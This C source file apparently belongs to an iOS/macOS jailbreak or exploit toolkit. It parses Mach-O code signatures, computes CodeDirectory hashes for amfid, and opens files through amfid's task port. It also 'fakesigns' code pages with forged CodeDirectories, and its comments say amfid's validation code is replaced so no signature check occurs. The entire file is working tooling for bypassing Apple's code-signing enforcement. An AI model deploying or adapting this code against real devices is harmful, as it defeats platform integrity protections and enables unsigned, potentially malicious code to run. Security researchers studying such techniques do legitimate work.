#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>

#include <mach-o/loader.h>
#include <mach-o/dyld.h>
#include <mach-o/fat.h>
#include <mach/machine.h>

#include <CommonCrypto/CommonDigest.h>

#include "cdhash.h"

#include "remote_file.h"

// if the kernel wants to verify the signature of a fat binary it will tell amfid
// the offset of the mach-o it wants verified in the file; use that information
// to make sure we compute the correct hash

// these three structure definitions are from opensource.apple.com from codesign.c in Security

#define CSMAGIC_CODEDIRECTORY 0xfade0c02
#define CS_SUPPORTSTEAMID     0x20200
#define CS_HASHTYPE_SHA1      1
#define PAGE_SHIFT_4K         12
/*
 * Structure of an embedded-signature SuperBlob
 */
typedef struct __BlobIndex {
  uint32_t type;                                  /* type of entry */
  uint32_t offset;                                /* offset of entry */
} CS_BlobIndex;

typedef struct __SuperBlob {
  uint32_t magic;                                 /* magic number */
  uint32_t length;                                /* total length of SuperBlob */
  uint32_t count;                                 /* number of index entries following */
  CS_BlobIndex index[];                   /* (count) entries */
  /* followed by Blobs in no particular order as indicated by offsets in index */
} CS_SuperBlob;


/*
 * C form of a CodeDirectory.
 */
typedef struct __CodeDirectory {
  uint32_t magic;         /* magic number (CSMAGIC_CODEDIRECTORY) */
  uint32_t length;        /* total length of CodeDirectory blob */
  uint32_t version;       /* compatibility version */
  uint32_t flags;         /* setup and mode flags */
  uint32_t hashOffset;    /* offset of hash slot element at index zero */
  uint32_t identOffset;   /* offset of identifier string */
  uint32_t nSpecialSlots;	/* number of special hash slots */
  uint32_t nCodeSlots;    /* number of ordinary (code) hash slots */
  uint32_t codeLimit;     /* limit to main image signature range */
  uint8_t hashSize;       /* size of each hash in bytes */
  uint8_t hashType;       /* type of hash (cdHashType* constants) */
  uint8_t platform;       /* platform identifier; zero if not platform binary */
  uint8_t	pageSize;       /* log2(page size in bytes); 0 => infinite */
  uint32_t spare2;        /* unused (must be zero) */
  /* Version 0x20100 */
  uint32_t scatterOffset; /* offset of optional scatter vector */
  /* Version 0x20200 */
  uint32_t teamOffset;    /* offset of optional team identifier */
  /* followed by dynamic content as located by offset fields above */
} CS_CodeDirectory;


size_t max_input_size = 200*1024*1024; // limit input binaries to 200MB

// run time assertion, exits on failure
static void
assert(int condition,
       char* failure_message)
{
  if (!condition) {
    printf("[-] %s\n", failure_message);
    exit(EXIT_FAILURE);
  }
}

static void*
read_file(int fd,
          size_t* size_out)
{
  int err = 0;
  struct stat st = {0};
  
  err = fstat(fd, &st);
  assert(err == 0, "can't stat input");
  
  size_t size = st.st_size;
  assert(size > 0, "input empty");
  assert(size < max_input_size, "input too large");
  
  void* buf = malloc(size);
  assert(buf != NULL, "can't allocate buffer for input file");
  
  ssize_t amount_read = read(fd, buf, size);
  assert(amount_read > 0, "can't read input file");
  assert((size_t)amount_read == size, "read truncated");
  
  *size_out = size;
  return buf;
}

static void*
find_cs_blob(uint8_t* buf,
             size_t size,
             uint64_t universal_file_offset)
{
  buf += universal_file_offset;
  struct mach_header_64* hdr = (struct mach_header_64*)(buf);
  
  uint32_t ncmds = hdr->ncmds;
  
  assert(ncmds < 1000, "too many load commands");
  
  uint8_t* commands = (uint8_t*)(hdr+1);
  for (uint32_t command_i = 0; command_i < ncmds; command_i++) {
    //assert(commands + sizeof(struct load_command) < end, "invalid load command");
    
    struct load_command* lc = (struct load_command*)commands;
    //assert(commands + lc->cmdsize <= end, "invalid load command");
    
    if (lc->cmd == LC_CODE_SIGNATURE) {
      struct linkedit_data_command* cs_cmd = (struct linkedit_data_command*)lc;
      printf("found LC_CODE_SIGNATURE blob at offset +0x%x\n", cs_cmd->dataoff);
      return ((uint8_t*)buf) + cs_cmd->dataoff;
    }
    
    commands += lc->cmdsize;
  }
  return NULL;
}

// do a SHA1 hash of the CodeDirectory
static void
hash_cd(CS_CodeDirectory* cd,
        uint8_t* hash_buf)
{
  uint8_t* buf = (uint8_t*) cd;
  CC_LONG len = ntohl(cd->length);
  
  CC_SHA1_CTX context;
  CC_SHA1_Init(&context);
  CC_SHA1_Update(&context, buf, len);
  CC_SHA1_Final(hash_buf, &context);
  
  printf("hash for amfid is:");
  for (int i = 0; i < CC_SHA1_DIGEST_LENGTH; i++) {
    printf("%02x", hash_buf[i]);
  }
  printf("\n");
  
}

static void
find_cd_hash(uint8_t* buf,
             size_t size,
             uint64_t universal_file_offset,
             uint8_t* hash_buf)
{
  if (size >= 0x1008 && ntohl(*(uint32_t*)(buf+0x1000)) == 0xfade0c02) {
    // this is a fakesigned patch file:
    CS_CodeDirectory* cd = (CS_CodeDirectory*)(buf+0x1000);
    printf("found code directory for fakesigned patch file\n");
    hash_cd(cd, hash_buf);
    return;
  }
  
  // otherwise parse the mach-o
  CS_SuperBlob* sb = (CS_SuperBlob*)find_cs_blob(buf, size, universal_file_offset);
  
  for (uint32_t i = 0; i < ntohl(sb->count); i++) {
    CS_BlobIndex* bi = &sb->index[i];
    uint8_t* blob = ((uint8_t*)sb) + (htonl(bi->offset)); // am I using the wrong transform there?
    if (htonl(*(uint32_t*)blob) == 0xfade0c02) {
      CS_CodeDirectory* cd = (CS_CodeDirectory*)blob;
      printf("found code directory\n");
      hash_cd(cd, hash_buf);
      // only want the first one
      return;
    }
  }
}

void
get_hash_for_amfid(mach_port_t amfid_task_port,
                   char* path,
                   uint64_t universal_file_offset,
                   uint8_t* hash_buf)
{
  // open the file in the context of amfid and get the file descriptor locally for us to use:
  int local_fd = remote_open(amfid_task_port, path, O_RDONLY, 0);
  if (local_fd < 0) {
    printf("unable to open %s via amfid (%d)\n", path, local_fd);
    return;
  }
  
  size_t size = 0;
  uint8_t* file_buf = read_file(local_fd, &size);
  close(local_fd);
  
  find_cd_hash(file_buf, size, universal_file_offset, hash_buf);

  free(file_buf);
}

/*
 we can actually just pass a CodeDirectory to fcntl F_ADDSIGS; don't need to
 
 //out of date:
 build a superblob which can be passed to fcntl F_SETSIGS
 to add a code signature to a mapped page

 structure:
 
  CS_SuperBlob
  CSBlobIndex -------+
                     |
  CS_CodeDirectory <-+
    slots[]
    identifier
    teamid
 
 the superblob will just contain one entry, a CS_CodeDirectory
 
 there's no signature block because I also replace the validatation code in amfid
 so it never gets to the signature check
 
*/
void*
fakesign(void* code,
         uint32_t code_size,
         char* identifier,       // NULL-terminated identifier string
         int is_platform_binary, // are we going to get loaded into a platform binary?
         char* teamid,           // if the target has a teamid (non-platform binary), what is it? (NULL-terminated string)
         uint32_t* blob_size)
{
  if (code_size != 0x1000) {
    printf("at the moment this is just for signing a single page\n");
    return NULL;
  }
  
  // compute the hash of code page:
  uint8_t code_hash[CC_SHA1_DIGEST_LENGTH];
  
  CC_SHA1_CTX context;
  CC_SHA1_Init(&context);
  CC_SHA1_Update(&context, code, code_size);
  CC_SHA1_Final(code_hash, &context);
  
  printf("code page hash is: ");
  for (int i = 0; i < CC_SHA1_DIGEST_LENGTH; i++) {
    printf("%02x\n", code_hash[i]);
  }
  printf("\n");
  
  // how big is the codedirectory plus its sub structures?
  size_t cdsize = sizeof(CS_CodeDirectory);
  
  size_t hashslots_offset = cdsize;
  // space for one code page hash
  cdsize += CC_SHA1_DIGEST_LENGTH;
  
  
  size_t identifier_size = strlen(identifier) + 1;
  size_t identifier_offset = cdsize;
  cdsize += identifier_size;
  
  // platform binaries don't have a teamid
  size_t teamid_size = 0;
  size_t teamid_offset = 0;
  if (!is_platform_binary) {
    teamid_size = strlen(teamid) + 1;
    teamid_offset = cdsize;
  }
  cdsize += teamid_size;
  

  
  CS_CodeDirectory* cd = malloc(cdsize);
  memset(cd, 0, cdsize);
  
  cd->magic = htonl(CSMAGIC_CODEDIRECTORY);
  cd->length = htonl(cdsize);
  cd->version = htonl(CS_SUPPORTSTEAMID);
  cd->flags = htonl(0);
  cd->hashOffset = htonl(hashslots_offset);
  cd->identOffset = htonl(identifier_offset);
  cd->nSpecialSlots = htonl(0);
  cd->nCodeSlots = htonl(1);
  cd->codeLimit = htonl(0x1000);
  cd->hashSize = CC_SHA1_DIGEST_LENGTH; // uint8_t
  cd->hashType = CS_HASHTYPE_SHA1;      // uint8_t
  cd->platform = 0;                     // uint8_t
  cd->pageSize = PAGE_SHIFT_4K;         // uint8_t
  cd->spare2 = htonl(0);
  cd->scatterOffset = htonl(0);
  cd->teamOffset = htonl(teamid_offset);

  
  // add the extra data to the end:
  uint8_t* cd_base = (uint8_t*)cd;
  
  // the hash slots (there's only one):
  uint8_t* hash_ptr = cd_base + hashslots_offset;
  memcpy(hash_ptr, code_hash, CC_SHA1_DIGEST_LENGTH);
  
  // the identifier string
  uint8_t* identifier_ptr = cd_base + identifier_offset;
  memcpy(identifier_ptr, identifier, identifier_size);
  
  // the teamid, if there is one
  if (teamid_offset != 0) {
    uint8_t* teamid_ptr = cd_base + teamid_offset;
    memcpy(teamid_ptr, teamid, teamid_size);
  }
#if 0
  // now put the cd inside a SuperBlob:
  size_t superblob_size = sizeof(CS_SuperBlob);
  superblob_size += sizeof(CS_BlobIndex);
  superblob_size += cdsize;
  
  CS_SuperBlob* superblob = malloc(superblob_size);
  memset(superblob, 0, superblob_size);
#endif
  *blob_size = (uint32_t)cdsize;
  return cd;
}














